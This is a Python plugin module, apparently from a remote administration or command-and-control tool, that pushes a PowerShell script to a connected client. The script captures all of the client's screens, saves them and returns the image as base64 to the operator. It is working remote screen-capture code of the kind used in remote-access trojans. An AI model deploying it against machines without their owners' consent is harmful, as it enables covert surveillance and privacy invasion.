def execute(client_interaction_ui, client_id):
    """Take a screenshot using PowerShell"""
    # This is a PowerShell script that takes a screenshot
    screenshot_code = """
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    
    $screens = [Windows.Forms.Screen]::AllScreens
    $top = $left = $width = $height = 0
    
    foreach ($screen in $screens) {
        $top = [Math]::Min($top, $screen.Bounds.Top)
        $left = [Math]::Min($left, $screen.Bounds.Left)
        $width = [Math]::Max($width, $screen.Bounds.Right)
        $height = [Math]::Max($height, $screen.Bounds.Bottom)
    }
    
    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, $bounds.Size)
    
    $tempPath = [System.IO.Path]::GetTempPath()
    $filePath = Join-Path $tempPath "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
    $bmp.Save($filePath)
    
    $bytes = [System.IO.File]::ReadAllBytes($filePath)
    $base64 = [Convert]::ToBase64String($bytes)
    Write-Output "Screenshot saved to: $filePath"
    Write-Output "Base64 data: $base64"
    """
    
    # Upload and execute the screenshot script
    client_interaction_ui.send_command(screenshot_code)
    
def get_description():
    """Get command description"""
    return "Take a screenshot and return path and base64 data"